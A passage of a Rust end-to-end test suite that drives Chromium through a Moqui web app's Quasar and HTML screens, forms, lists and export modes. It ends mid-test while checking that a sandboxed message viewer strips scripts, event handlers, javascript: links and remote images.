fn qapps_fixture(browser: &mut Browser, base: &str, gate: &common::Gate, description: &str, action: (&str, &str)) {
    let (action_id, action_label) = action;
    let page = format!("{base}/qapps{FIXTURE}?artifactGroupId=SYSTEM_APP");
    browser.navigate(&page);
    browser.wait_for(
        "the shell mounted",
        "!!(window.moqui && moqui.webrootVue) && document.getElementById('apps-root').style.display !== 'none'",
        WAIT,
    );
    browser.wait_for(
        "the form-single shows its value",
        &format!("Array.from(document.querySelectorAll('input')).some((el) => el.value === {description:?})"),
        WAIT,
    );
    browser.wait_for(
        "the rows of the authorizations",
        "document.body.innerText.indexOf('SYSTEM_APP_ADMIN') >= 0",
        WAIT,
    );
    browser.eval(FETCH_SPY);
    // a single m-drop-down shows the selected option's label in the page (hide-selected is only for multiple)
    let text = browser.eval(
        "document.body.innerText + '\\n' + Array.from(document.querySelectorAll('input')).map((el) => el.value).join('\\n')",
    );
    let text = text.as_str().unwrap();
    for wanted in [
        "Artifact Group Detail",
        "SYSTEM_APP_ALL",
        "Administrators (full access) -",
        "Always Allow (overrides Deny)",
        "component://tools/screen/System.xml",
    ] {
        assert!(text.contains(wanted), "{wanted} in {text}");
    }
    for literal in ["{{", "${", "ec."] {
        assert!(!text.contains(literal), "{literal} in {text}");
    }
    // the m-form is a QForm, and Chart.js and Mermaid are not loaded on a page that does not use them
    assert_eq!(
        browser.eval("document.getElementById('ArtifactGroupForm').classList.contains('q-form')"),
        true
    );
    assert_eq!(
        browser.eval("typeof window.Chart + typeof window.mermaid"),
        "undefinedundefined"
    );

    // a dialog: its button opens a QDialog with a drop-down whose options the server gave
    browser.click("the add authorization button", &by_text("button", "Add Authorization"));
    browser.wait_for(
        "the dialog",
        "Array.from(document.querySelectorAll('.q-dialog')).some((el) => el.innerText.indexOf('User Group') >= 0)",
        WAIT,
    );
    browser.click(
        "the user group drop-down",
        "document.querySelector('.q-dialog [id=\"CreateArtifactAuthz_userGroupId\"]')",
    );
    browser.wait_for(
        "the options of the user group",
        "Array.from(document.querySelectorAll('.q-menu .q-item')).some((el) => el.innerText.indexOf('Administrators (full access)') >= 0)",
        WAIT,
    );
    // Escape closes the menu, and the close button of the dialog the dialog
    browser.press("Escape");
    browser.wait_for(
        "the menu closed",
        "document.querySelectorAll('.q-menu').length === 0",
        WAIT,
    );
    if browser.eval("document.querySelectorAll('.q-dialog').length > 0") == true {
        browser.click("the close button of the dialog", &by_text(".q-dialog button", "close"));
    }
    browser.wait_for(
        "the dialog closed",
        "document.querySelectorAll('.q-dialog').length === 0",
        WAIT,
    );

    // a row of the list: choose another action in its Quasar menu and post the row
    browser.click(
        "the action of the second authorization",
        "document.getElementById('ArtifactAuthzList_authzActionEnumId_1')",
    );
    browser.click(
        "the new action",
        &format!("Array.from(document.querySelectorAll('.q-menu .q-item')).find((el) => el.innerText.trim() === {action_label:?})"),
    );
    browser.wait_for(
        "the menu closed",
        "document.querySelectorAll('.q-menu').length === 0",
        WAIT,
    );
    browser.click(
        "the update button of the row",
        "Array.from(document.querySelectorAll('[id=\"ArtifactAuthzList_1\"] button')).find((el) => el.innerText.trim() === 'Update')",
    );
    let posted = fetched(browser, "the post of the row", "/updateArtifactAuthz");
    assert_eq!(posted["method"], "POST", "{posted}");
    assert_eq!(posted["status"], 200, "{posted}");
    browser.wait_for("the row was stored", "window.__gate.fetches.length > 0", WAIT);
    let deadline = std::time::Instant::now() + WAIT;
    while authz_action(gate) != action_id {
        assert!(
            std::time::Instant::now() < deadline,
            "the row post did not store {action_id}"
        );
        std::thread::sleep(Duration::from_millis(100));
    }
    browser.pump(Duration::from_millis(500));
    assert_clean(browser, &page);
}

/// Server-merged qvt widgets in the shell: Chart.js and Mermaid load on first use, click to edit is a QPopupEdit, a date comes from
/// a QDate popup, the drop-down from a QMenu, the form posts in the background, the column dialog opens, and the list pages.
fn qapps_widgets(browser: &mut Browser, base: &str) {
    let page = format!("{base}/qapps/GateWidgets");
    browser.navigate(&page);
    browser.wait_for(
        "the screen",
        "document.body.innerText.indexOf('Gate widgets') >= 0",
        WAIT,
    );
    browser.eval(FETCH_SPY);
    // a box with initial="closed" starts closed (its Boolean prop is bound, not the text "false") and opens from its title
    assert_eq!(
        browser.eval("(() => { const text = Array.from(document.querySelectorAll('p')).find((el) => el.textContent === 'Shown once opened'); return !!text && text.offsetParent === null; })()"),
        true
    );
    browser.click(
        "the closed box's title",
        &by_text(".m-container-box .text-subtitle1", "Gate closed box"),
    );
    browser.wait_for(
        "the box opened",
        "Array.from(document.querySelectorAll('p')).some((el) => el.textContent === 'Shown once opened' && el.offsetParent !== null)",
        WAIT,
    );
    browser.wait_for(
        "Chart.js drew the chart",
        "!!(window.Chart && Chart.getChart(document.querySelector('#GateCharts canvas')))",
        WAIT,
    );
    browser.wait_for(
        "Mermaid drew the diagram",
        "!!(window.mermaid && document.querySelector('#GateCharts svg') && document.querySelector('#GateCharts svg').textContent.indexOf('GateB') >= 0)",
        WAIT,
    );

    // click to edit
    browser.click("the editable text", "document.getElementById('GateEditable')");
    browser.wait_for(
        "the popup editor",
        "!!document.querySelector('.q-popup-edit input')",
        WAIT,
    );
    browser.eval(
        "(() => { const input = document.querySelector('.q-popup-edit input'); input.value = 'Edited in Quasar';          input.dispatchEvent(new Event('input', {bubbles: true})); return true; })()",
    );
    browser.click("the save button", &by_text(".q-popup-edit button", "Save"));
    let saved = fetched(browser, "the editable post", "/saveValue");
    assert_eq!(saved["status"], 200, "{saved}");
    let body: serde_json::Value = serde_json::from_str(saved["body"].as_str().unwrap()).unwrap();
    assert_eq!(body["saved"], "Edited in Quasar", "{saved}");
    browser.wait_for(
        "the new text",
        "document.getElementById('GateEditable').innerText.trim() === 'Edited in Quasar'",
        WAIT,
    );

    // the note, a date from the QDate popup, and Beta from the drop-down's menu
    browser.click("the note", "document.querySelector('[id=\"NoteForm_note\"]')");
    browser.type_text("hello");
    browser.click(
        "the calendar button of the date",
        "(document.querySelector('[id=\"NoteForm_when\"]') || {closest: () => null}).closest('.q-field').querySelector('.q-icon, button')",
    );
    browser.wait_for("the date popup", "!!document.querySelector('.q-date')", WAIT);
    browser.click("day 15", &by_text(".q-date__calendar-item button", "15"));
    browser.wait_for(
        "the date",
        "/^\\d{4}-\\d\\d-15$/.test(document.querySelector('[id=\"NoteForm_when\"]').value)",
        WAIT,
    );
    browser.press("Escape");
    browser.click("the kind drop-down", "document.querySelector('[id=\"NoteForm_kind\"]')");
    browser.click(
        "Beta",
        "Array.from(document.querySelectorAll('.q-menu .q-item')).find((el) => el.innerText.trim() === 'Beta')",
    );
    browser.wait_for(
        "the menu closed",
        "document.querySelectorAll('.q-menu').length === 0",
        WAIT,
    );
    browser.click("the send button", &by_text("button", "Send"));
    let sent = fetched(browser, "the form post", "/saveNote");
    assert_eq!(sent["status"], 200, "{sent}");
    let body: serde_json::Value = serde_json::from_str(sent["body"].as_str().unwrap()).unwrap();
    assert_eq!(body["note"], "hello", "{sent}");
    assert_eq!(body["kind"], "B", "{sent}");
    assert!(body["when"].as_str().unwrap().ends_with("-15"), "{sent}");
    browser.wait_for(
        "the message of the form",
        "document.body.innerText.indexOf('Note sent') >= 0",
        WAIT,
    );

    // a validation error from the transition is drawn on its Quasar field
    browser.click("the code", "document.querySelector('[id=\"CodeForm_code\"]')");
    browser.type_text("abc");
    field_error_by_its_field(
        browser,
        &by_text("button", "Check"),
        "Array.from(document.querySelectorAll('.q-field--error')).some((el) => el.innerText.indexOf('Code needs a digit') >= 0)",
        "Array.from(document.querySelectorAll('.q-notification')).some((el) => el.innerText.indexOf('Code needs a digit') >= 0)",
    );
    browser.type_text("1");
    browser.wait_for(
        "the error cleared by a new value",
        "document.querySelectorAll('.q-field--error').length === 0",
        WAIT,
    );

    // the column dialog
    browser.click("the columns button", &by_text("button", "view_column\nColumns"));
    browser.wait_for(
        "the column dialog",
        "Array.from(document.querySelectorAll('.q-dialog')).some((el) => el.innerText.indexOf('Enum ID') >= 0)",
        WAIT,
    );
    browser.press("Escape");
    browser.wait_for(
        "the dialog closed",
        "document.querySelectorAll('.q-dialog').length === 0",
        WAIT,
    );

    // the pages of the list
    browser.click("page 2", &by_text(".q-pagination button", "2"));
    browser.wait_for("page 2", "/\\b21-40 \\/ \\d+/.test(document.body.innerText)", WAIT);
    browser.pump(Duration::from_millis(500));
    assert_clean(browser, &page);
}

/// A background submit whose transition leaves a validation error for `code`: the error shows by the field (`shown` finds it) and is
/// not also a toast (`toast` finds one). The 500 of the answer is the only problem on the console.
fn field_error_by_its_field(browser: &mut Browser, submit: &str, shown: &str, toast: &str) {
    browser.click("the check button", submit);
    let answer = fetched(browser, "the check post", "/checkCode");
    assert_eq!(answer["status"], 500, "{answer}");
    let body: serde_json::Value = serde_json::from_str(answer["body"].as_str().unwrap()).unwrap();
    assert_eq!(body["validationErrors"][0]["field"], "code", "{answer}");
    assert_eq!(body["validationErrors"][0]["fieldPretty"], "Code", "{answer}");
    browser.wait_for("the error by the field", shown, WAIT);
    browser.pump(Duration::from_millis(300));
    assert_eq!(
        browser.eval(toast),
        serde_json::Value::Bool(false),
        "the field error is not also a toast"
    );
    let problems = browser.take_problems();
    assert!(
        problems.iter().all(|problem| format!("{problem:?}").contains("500")),
        "only the 500 of the answer: {problems:#?}"
    );
}

/// The server-static fixture: the template is a script that registers a render function, and the data comes from `/actions`.
fn static_fixture(browser: &mut Browser, base: &str) {
    let page = format!("{base}/qapps{FIXTURE}?artifactGroupId=SYSTEM_APP");
    browser.navigate(&page);
    browser.wait_for(
        "the form-single shows its value from /actions",
        "Array.from(document.querySelectorAll('input')).some((el) => el.value === 'System App (via root screen)')",
        WAIT,
    );
    browser.wait_for(
        "the rows from /actions/ArtifactAuthzList",
        "document.body.innerText.indexOf('SYSTEM_APP_ADMIN') >= 0",
        WAIT,
    );
    let path = format!("/apps{FIXTURE}");
    assert_eq!(
        browser.eval(&format!("typeof (moqui.qvtStatic || {{}})[{path:?}]")),
        "function"
    );
    let resources = browser.eval("performance.getEntriesByType('resource').map((entry) => entry.name)");
    let resources: Vec<&str> = resources
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|name| name.as_str())
        .collect();
    assert!(
        resources.iter().any(|name| name.contains(&format!("{path}.qvt"))),
        "{resources:?}"
    );
    assert!(
        resources.iter().any(|name| name.contains(&format!("{path}/actions?"))),
        "{resources:?}"
    );
    assert!(
        resources
            .iter()
            .any(|name| name.contains(&format!("{path}/actions/ArtifactAuthzList"))),
        "{resources:?}"
    );
    assert_clean(browser, &page);
}

/// A server-static list: its pages and sort fetch `/actions/EnumList` and redraw.
fn static_list(browser: &mut Browser, base: &str) {
    let page = format!("{base}/qapps/GateStaticList");
    browser.navigate(&page);
    browser.wait_for("the list", "/1-20 \\/ \\d+/.test(document.body.innerText)", WAIT);
    assert_eq!(
        browser.eval("typeof (moqui.qvtStatic || {})['/apps/GateStaticList']"),
        "function"
    );
    // every component runs its precompiled render function: none is left with a string template for the browser to compile
    assert_eq!(
        browser.eval("Object.keys(moqui.qvt.components).filter((name) => typeof moqui.qvt.components[name].template === 'string').join(',')"),
        ""
    );
    let text = browser.eval("document.body.innerText");
    let text = text.as_str().unwrap();
    assert!(text.contains("Enumerations of john.doe"), "{text}");
    for literal in ["{{", "${", "ec."] {
        assert!(!text.contains(literal), "{literal} in {text}");
    }
    browser.eval(FETCH_SPY);
    // the first cell of a row is its row-selection checkbox; the enum id is the second
    let first_row =
        "document.querySelectorAll('#EnumList_table .tbody .tr')[0].querySelectorAll('.td')[1].innerText.trim()";
    let first = browser.eval(first_row);
    browser.click("page 2", &by_text(".q-pagination button", "2"));
    browser.wait_for("page 2", "/\\b21-40 \\/ \\d+/.test(document.body.innerText)", WAIT);
    let rows = fetched(browser, "the rows of page 2", "/actions/EnumList");
    assert!(rows["url"].as_str().unwrap().contains("pageIndex=1"), "{rows}");
    assert_ne!(browser.eval(first_row), first);
    // descending by the enum id: the first row is the last id
    browser.click(
        "the descending sort of the enum id",
        "document.querySelectorAll('#EnumList_table .thead .form-order-by a')[1]",
    );
    browser.wait_for(
        "sorted, back on the first page",
        "/1-20 \\/ \\d+/.test(document.body.innerText) && window.__gate.fetches.some((f) => f.url.indexOf('orderByField=-enumId') >= 0)",
        WAIT,
    );
    let ids = browser.eval("Array.from(document.querySelectorAll('#EnumList_table .tbody .tr')).map((tr) => tr.querySelectorAll('.td')[1].innerText.trim())");
    let ids: Vec<String> = ids
        .as_array()
        .unwrap()
        .iter()
        .map(|id| id.as_str().unwrap().to_string())
        .collect();
    // the database collation orders, so the check is the ends of the page, not a byte order
    assert_eq!(ids.len(), 20, "{ids:?}");
    // a C collation (initdb with no LANG) is byte order, where lowercase sorts after uppercase
    let after = |a: &str, b: &str| a > b || a.to_lowercase() > b.to_lowercase();
    assert!(after(&ids[0], &ids[19]), "{ids:?}");
    assert!(after(&ids[0], first.as_str().unwrap()), "{ids:?}");

    // the csv export, an item of the Export menu, goes to the screen in csv with the current sort
    browser.click(
        "the Export menu",
        "Array.from(document.querySelectorAll('.q-btn-dropdown')).find((el) => el.innerText.toLowerCase().indexOf('export') >= 0)",
    );
    let csv = browser.wait_for(
        "the csv export item",
        "(Array.from(document.querySelectorAll('.q-menu a')).find((a) => a.href.indexOf('renderMode=csv') >= 0) || {}).href",
        WAIT,
    );
    let csv = csv.as_str().unwrap();
    assert!(
        csv.contains("/apps/GateStaticList?") && csv.contains("orderByField=-enumId"),
        "{csv}"
    );
    browser.press("Escape");
    browser.wait_for(
        "the menu closed",
        "document.querySelectorAll('.q-menu').length === 0",
        WAIT,
    );

    // the find dialog: the header field and the order by
    browser.click("Find Options", &by_text(".q-btn", "Find Options"));
    browser.wait_for(
        "the find dialog",
        "Array.from(document.querySelectorAll('.q-dialog')).some((el) => el.innerText.indexOf('Clear Parameters') >= 0 && el.innerText.indexOf('Order By') >= 0)",
        WAIT,
    );
    browser.press("Escape");
    browser.wait_for(
        "the dialog closed",
        "document.querySelectorAll('.q-dialog').length === 0",
        WAIT,
    );

    // the saved finds dialog: a new saved find of the current sort
    browser.click("Saved Finds", &by_text(".q-btn", "Saved Finds"));
    browser.wait_for(
        "the saved finds dialog",
        "Array.from(document.querySelectorAll('.q-dialog')).some((el) => el.innerText.indexOf('Save New Find') >= 0)",
        WAIT,
    );
    browser.click(
        "the find description",
        "document.querySelector('#EnumList_NewFind_description')",
    );
    browser.type_text("Gate find");
    browser.click("Save New Find", &by_text(".q-dialog .q-btn", "Save New Find"));
    fetched(browser, "the saved find post", "/formSaveFind");
    browser.wait_for(
        "the saved find in the next form request",
        "window.__gate.fetches.some((f) => f.url.indexOf('/actions/EnumList') >= 0 && f.url.indexOf('formListFindId=') >= 0)",
        WAIT,
    );
    browser.press("Escape");
    browser.wait_for(
        "the dialog closed",
        "document.querySelectorAll('.q-dialog').length === 0",
        WAIT,
    );
    browser.click("Saved Finds", &by_text(".q-btn", "Saved Finds"));
    browser.wait_for(
        "the saved find listed",
        "Array.from(document.querySelectorAll('.q-dialog')).some((el) => el.innerText.indexOf('Gate find') >= 0)",
        WAIT,
    );
    browser.press("Escape");
    browser.wait_for(
        "the dialog closed",
        "document.querySelectorAll('.q-dialog').length === 0",
        WAIT,
    );

    // row selection: check the first row, open the row actions, and the action posts the selected id as enumId_0
    let picked = browser
        .eval("document.querySelectorAll('#EnumList_table .tbody .tr')[0].querySelectorAll('.td')[1].innerText.trim()");
    browser.click(
        "the first row's checkbox",
        "document.querySelector('#EnumList_table .tbody .q-checkbox')",
    );
    browser.click(
        "the row actions",
        "document.querySelector('#EnumList_table .thead .q-btn')",
    );
    browser.click("Pick", &by_text(".q-menu .q-btn", "Pick"));
    browser.click("Pick Them", &by_text(".q-dialog .q-btn", "Pick Them"));
    let post = fetched(browser, "the row action post", "/pickEnums");
    let sent: Vec<String> = post["sent"]
        .as_array()
        .unwrap()
        .iter()
        .map(|item| item.as_str().unwrap().to_string())
        .collect();
    assert!(
        sent.contains(&format!("enumId_0={}", picked.as_str().unwrap())) && sent.contains(&"_isMulti=true".to_string()),
        "{sent:?}"
    );
    browser.press("Escape");
    browser.wait_for(
        "the dialog closed",
        "document.querySelectorAll('.q-dialog').length === 0",
        WAIT,
    );
    browser.press("Escape");
    browser.wait_for(
        "the menu closed",
        "document.querySelectorAll('.q-menu').length === 0",
        WAIT,
    );

    // the column picker: the dialog lists the columns, and Reset to Default posts and reloads the list
    browser.click("Columns", &by_text(".q-btn", "Columns"));
    browser.wait_for(
        "the column dialog",
        "Array.from(document.querySelectorAll('.q-dialog')).some((el) => el.innerText.indexOf('Do Not Display') >= 0 && el.innerText.indexOf('Enum ID') >= 0)",
        WAIT,
    );
    let before = browser.eval("window.__gate.fetches.filter((f) => f.url.indexOf('/actions/EnumList') >= 0).length");
    browser.click("Reset to Default", &by_text(".q-dialog .q-btn", "Reset to Default"));
    fetched(browser, "the column reset post", "/formSelectColumns");
    browser.wait_for(
        "the list fetched again",
        &format!("window.__gate.fetches.filter((f) => f.url.indexOf('/actions/EnumList') >= 0).length > {before}"),
        WAIT,
    );
    browser.press("Escape");
    browser.wait_for(
        "the dialog closed",
        "document.querySelectorAll('.q-dialog').length === 0",
        WAIT,
    );

    // the board view over the rows the list fetched: a column per type, a card per row (its card slot over the row's scope), and
    // the list's nav row above it; back to the list, the rows are there again
    browser.click(
        "Board",
        "document.querySelector('#EnumList_views .m-list-views-toggle [data-view=board]')",
    );
    browser.wait_for(
        "the board of the page's rows",
        "document.querySelectorAll('#EnumList_views .m-board-card').length === 20 && document.querySelectorAll('#EnumList_views .m-board-col').length > 0 \
         && document.querySelector('#EnumList_table .tbody').offsetParent === null",
        WAIT,
    );
    let card = browser.eval("document.querySelector('#EnumList_views .m-board-card').innerText");
    assert!(card.as_str().unwrap().contains("Description"), "{card}");
    browser.click(
        "List",
        "document.querySelector('#EnumList_views .m-list-views-toggle [data-view=list]')",
    );
    browser.wait_for(
        "the list again",
        "document.querySelector('#EnumList_table .tbody').offsetParent !== null && document.querySelectorAll('#EnumList_table .tbody .tr').length === 20",
        WAIT,
    );
    assert_clean(browser, &page);
}

/// The fixture as `html`: the client is bound, the dialogs open and close, and the form posts through its transition.
fn html_fixture(browser: &mut Browser, base: &str) {
    // under /apps, so the page has the shell: the navbar the screen's menus move into
    let page = format!("{base}/apps{FIXTURE}.html?artifactGroupId=SYSTEM_APP");
    browser.navigate(&page);
    browser.wait_for(
        "moqui-html.js bound the page",
        "!!window.moqui && document.documentElement.classList.contains('js')",
        WAIT,
    );
    assert_eq!(
        browser.eval("document.querySelectorAll('script[src*=\"moqui-html.js\"]').length"),
        1
    );
    assert_eq!(
        browser.eval("document.getElementById('ArtifactGroupForm_description').value"),
        "System App (via root screen)"
    );
    let text = browser.eval("document.body.innerText");
    let text = text.as_str().unwrap();
    for wanted in [
        "SYSTEM_APP_ADMIN",
        "Always Allow (overrides Deny)",
        "Administrators (full access) -",
        "component://tools/screen/System.xml",
    ] {
        assert!(text.contains(wanted), "{wanted} in {text}");
    }
    assert_eq!(browser.eval("document.querySelectorAll('table.form-list').length"), 3);
    // menus moved into the navbar
    browser.wait_for(
        "menus in the navbar",
        "document.querySelectorAll('#header-menus > li').length > 0",
        WAIT,
    );
    // a native dialog opens from its button and closes from its close button
    browser.click(
        "the add authorization button",
        "document.querySelector('[data-dialog=\"AddAuthzDialog\"]')",
    );
    browser.wait_for(
        "the dialog is open",
        "document.getElementById('AddAuthzDialog').open",
        WAIT,
    );
    browser.click(
        "the close button",
        "document.querySelector('#AddAuthzDialog [data-close]')",
    );
    browser.wait_for(
        "the dialog is closed",
        "!document.getElementById('AddAuthzDialog').open",
        WAIT,
    );
    assert_clean(browser, &page);

    // the form posts with the token of the page, the transition redirects back, and the page shows the new value
    browser.eval(
        "(() => { document.getElementById('ArtifactGroupForm_description').value = 'Posted from Chromium'; \
         document.getElementById('ArtifactGroupForm').requestSubmit(); return true; })()",
    );
    browser.wait_event("Page.loadEventFired", WAIT);
    browser.wait_for(
        "the page after the post shows the new value",
        "(document.getElementById('ArtifactGroupForm_description') || {}).value === 'Posted from Chromium'",
        WAIT,
    );
    assert_eq!(
        browser.eval("location.pathname + location.search"),
        format!("/apps{FIXTURE}?artifactGroupId=SYSTEM_APP")
    );
    assert_clean(browser, "the fixture after the post");
}

/// Click to edit, a background submit, the column picker with SortableJS loaded on use, and the pages of a form-list, in `html`.
fn html_widgets(browser: &mut Browser, base: &str) {
    let page = format!("{base}/apps/GateWidgets");
    browser.navigate(&page);
    browser.wait_for("the client", "!!window.moqui", WAIT);
    browser.eval(FETCH_SPY);

    // click to edit
    browser.click("the editable text", "document.getElementById('GateEditable')");
    browser.wait_for(
        "the editor",
        "!!document.querySelector('#GateEditable form input')",
        WAIT,
    );
    browser.eval(
        "(() => { const form = document.querySelector('#GateEditable form'); form.querySelector('input').value = 'Edited in Chromium'; \
         form.requestSubmit(); return true; })()",
    );
    let saved = fetched(browser, "the editable post", "/saveValue");
    assert_eq!(saved["status"], 200, "{saved}");
    let body: serde_json::Value = serde_json::from_str(saved["body"].as_str().unwrap()).unwrap();
    assert_eq!(body["saved"], "Edited in Chromium", "{saved}");
    browser.wait_for(
        "the new text",
        "document.getElementById('GateEditable').textContent === 'Edited in Chromium'",
        WAIT,
    );

    // a background submit with a date, a drop-down, a multiple drop-down that Tom Select (loaded on use) runs, and the success message
    browser.wait_for(
        "Tom Select on the multiple drop-down",
        "!!(window.TomSelect && document.querySelector('#NoteForm select[name=\"tags\"]').tomselect)",
        WAIT,
    );
    browser.eval("document.querySelector('#NoteForm select[name=\"tags\"]').tomselect.setValue(['X', 'Y'])");
    browser.eval(
        "(() => { const form = document.getElementById('NoteForm'); form.note.value = 'hello'; form.when.value = '2026-10-13'; \
         const kind = form.kind; if (kind.tomselect) kind.tomselect.setValue('B'); else kind.value = 'B'; return true; })()",
    );
    browser.click("the send button", "document.querySelector('#NoteForm [type=submit]')");
    let sent = fetched(browser, "the background submit", "/saveNote");
    assert_eq!(sent["status"], 200, "{sent}");
    let body: serde_json::Value = serde_json::from_str(sent["body"].as_str().unwrap()).unwrap();
    assert_eq!(body["note"], "hello", "{sent}");
    assert_eq!(body["when"], "2026-10-13", "{sent}");
    assert_eq!(body["kind"], "B", "{sent}");
    assert_eq!(body["tags"], serde_json::json!(["X", "Y"]), "{sent}");
    browser.wait_for(
        "the message of the form",
        "Array.from(document.querySelectorAll('#toasts .alert')).some((el) => el.textContent.indexOf('Note sent') >= 0)",
        WAIT,
    );
    assert_eq!(
        browser.eval("location.pathname"),
        "/apps/GateWidgets",
        "a background submit stays on the page"
    );

    // a validation error from the transition shows by its field, with the markup of the form macros
    browser.eval("(() => { document.getElementById('CodeForm').code.value = 'abc'; return true; })()");
    field_error_by_its_field(
        browser,
        "document.querySelector('#CodeForm [type=submit]')",
        "(() => { const box = document.querySelector('#CodeForm [name=\"code\"]').closest('.field'); return box.hasAttribute('data-invalid') \
         && box.querySelector('.field-error').textContent === 'Code needs a digit'; })()",
        "Array.from(document.querySelectorAll('#toasts .alert')).some((el) => el.textContent.indexOf('Code needs a digit') >= 0)",
    );

    // the column picker: SortableJS is loaded when the dialog's list is bound, and the tree is written to the hidden input
    browser.wait_for("SortableJS loaded on use", "!!window.Sortable", WAIT);
    browser.click(
        "the columns button",
        "document.querySelector('[data-dialog=\"EnumList_SelColsDialog\"]')",
    );
    browser.wait_for(
        "the columns dialog",
        "document.getElementById('EnumList_SelColsDialog').open",
        WAIT,
    );
    let tree = browser.wait_for(
        "the columns tree",
        "document.getElementById('EnumList_SelColsForm_columnsTree').value",
        WAIT,
    );
    let tree: serde_json::Value = serde_json::from_str(tree.as_str().unwrap()).unwrap();
    assert_eq!(tree[0]["id"], "hidden", "{tree}");
    assert!(
        tree.as_array().unwrap().iter().any(|column| column["children"]
            .as_array()
            .is_some_and(|fields| fields.iter().any(|field| field["id"] == "enumId"))),
        "{tree}"
    );
    browser.click(
        "the close button",
        "document.querySelector('#EnumList_SelColsDialog [data-close]')",
    );
    assert_clean(browser, &page);

    // the pages of the list
    let first = browser.eval("document.querySelector('#EnumList_table tbody tr td').innerText.trim()");
    browser.click("page 2", &by_text("ul.pagination a", "2"));
    browser.wait_event("Page.loadEventFired", WAIT);
    browser.wait_for(
        "page 2",
        "/Page 2 of \\d+ \\(21 - 40 of \\d+\\)/.test(document.body.innerText)",
        WAIT,
    );
    assert_ne!(
        browser.eval("document.querySelector('#EnumList_table tbody tr td').innerText.trim()"),
        first
    );
    // sort by the description, descending
    browser.click(
        "the sort of the description",
        "document.querySelector('#EnumList_table thead a[href*=\"orderByField=-description\"]')",
    );
    browser.wait_event("Page.loadEventFired", WAIT);
    browser.wait_for(
        "sorted",
        "location.search.indexOf('orderByField=-description') >= 0",
        WAIT,
    );
    let descriptions = browser.eval(
        "Array.from(document.querySelectorAll('#EnumList_table tbody tr')).map((tr) => tr.children[1].innerText.trim())",
    );
    let descriptions: Vec<String> = descriptions
        .as_array()
        .unwrap()
        .iter()
        .map(|text| text.as_str().unwrap().to_string())
        .collect();
    // the database collation orders, so the check is the ends of the page, not a byte order
    assert_eq!(descriptions.len(), 20);
    assert!(
        descriptions[0].to_lowercase() > descriptions[19].to_lowercase(),
        "{descriptions:?}"
    );
    assert_clean(browser, "the widgets after paging and sorting");
}

/// `html-print` has no client, and `text`, `csv` and `xml` come back to a page's fetch with their types.
fn print_and_text_modes(browser: &mut Browser, base: &str) {
    let page = format!("{base}{FIXTURE}.html-print?artifactGroupId=SYSTEM_APP");
    browser.navigate(&page);
    assert_eq!(browser.eval("typeof window.moqui"), "undefined");
    assert_eq!(browser.eval("document.scripts.length"), 0);
    assert_eq!(browser.eval("document.querySelectorAll('table.form-list').length"), 3);
    let text = browser.eval("document.body.innerText");
    assert!(
        text.as_str().unwrap().contains("Always Allow (overrides Deny)"),
        "{text}"
    );
    assert_clean(browser, &page);

    for (mode, content_type, wanted) in [
        ("text", "text/plain;charset=UTF-8", "Artifact Group ID"),
        (
            "csv",
            "text/csv;charset=UTF-8",
            "Artifact Type,Artifact Name,Name Is Pattern",
        ),
        (
            "xml",
            "text/xml;charset=UTF-8",
            "<ArtifactAuthzListEntry artifactAuthzId=\"SYSTEM_APP_ADMIN\"",
        ),
    ] {
        let answer = browser.eval(&format!(
            "fetch('{FIXTURE}.{mode}?artifactGroupId=SYSTEM_APP').then((r) => r.text().then((body) => ({{status: r.status, type: r.headers.get('content-type'), body}})))"
        ));
        assert_eq!(answer["status"], 200, "{mode}: {answer}");
        assert_eq!(answer["type"], content_type, "{mode}");
        assert!(answer["body"].as_str().unwrap().contains(wanted), "{mode}: {answer}");
    }
    let parsed = browser.eval(&format!(
        "fetch('{FIXTURE}.xml?artifactGroupId=SYSTEM_APP').then((r) => r.text()).then((t) => {{ const d = new DOMParser().parseFromString(t, 'text/xml'); \
         return d.querySelector('parsererror') ? 'error' : d.querySelectorAll('ArtifactAuthzListEntry').length; }})"
    ));
    assert_eq!(parsed, 2, "the xml mode parses as XML");
    assert_clean(browser, "the text modes");
}

/// m-html-view on the gallery Message screen (IronStone design-drawers-commons §12 reading pane): the designed message is
/// cleaned into a frame sandboxed without scripts, so its script, its onerror handler and its javascript: link do not run and
/// its form is gone; its remote image and tracking pixel are not fetched (no request at all) until Show images, and its cid:
/// image is the host's file as a data: URL; its links open in a new window without the opener; the reply history opens from
/// its "..." with a real click in the frame; and the frame is as tall as its content before and after. The plain message is
/// escaped, with its links and its quoted reply collapsed, and follows dark mode while the designed one stays a light card.
#[test]
fn the_html_view_cleans_sandboxes_and_sizes_a_message_in_chromium() {
    let gate = start("browser-htmlview");
    let base = format!("http://{}", gate.server.address());
    let mut browser = Browser::launch();
    sign_in(&mut browser, &base);
    browser.call(
        "Emulation.setDeviceMetricsOverride",
        serde_json::json!({"width": 1280, "height": 900, "deviceScaleFactor": 1, "mobile": false}),
    );
    browser.navigate(&format!("{base}/qapps/gallery/Message"));
    let frame = |id: &str| format!("document.querySelector('#{id} iframe')");
    let doc = |id: &str| format!("{}.contentDocument", frame(id));
    let fits = |id: &str| {
        format!(
            "(() => {{ const f = {}; const d = f && f.contentDocument; const r = d && d.getElementById('m-hv-root'); \
             return !!r && f.offsetHeight > 30 && Math.abs(f.offsetHeight - Math.max(Math.ceil(r.getBoundingClientRect().height), 16)) <= 1; }})()",
            frame(id)
        )
    };
    browser.wait_for(
        "the designed message in its frame",
        &format!(
            "document.querySelector('#DesignedMessage').dataset.state === 'ready' && !!{d} && !!{d}.querySelector('.m-hv-blocked') && {fits}",
            d = doc("DesignedMessage"),
            fits = fits("DesignedMessage")
        ),
        WAIT,
    );
    browser.wait_for("the plain message in its frame", &fits("PlainMessage"), WAIT);
    // nothing of the message ran or reached the network
    browser.pump(Duration::from_millis(1500));
    assert_eq!(browser.eval("window.__htmlViewRan === undefined"), true);
    assert_eq!(
        browser.eval(&format!("{}.getAttribute('sandbox')", frame("DesignedMessage"))),
        "allow-same-origin allow-popups allow-popups-to-escape-sandbox"
    );
    let cleaned = browser.eval(&format!(
        "(() => {{ const d = {}; return {{ scripts: d.querySelectorAll('script').length, handlers: d.querySelectorAll('[onerror]').length, \
         forms: d.querySelectorAll('form, input, button').length, remote: d.querySelectorAll('img[src^=\"http\"]').length, \
         blocked: d.querySelectorAll('.m-hv-blocked[title=\"Image hidden\"]').length, cid: d.querySelectorAll('img[src^=\"data:image/png\"]').length, \
         bad: d.querySelectorAll('a[href^=\"javascript\"]').length, good: (d.querySelector('a[href=\"https://moqui.org/\"]') || {{}}).rel, \
         target: (d.querySelector('a[href=\"https://moqui.org/\"]') || {{}}).target, fixed: d.querySelectorAll('[style*=\"fixed\"]').length, \
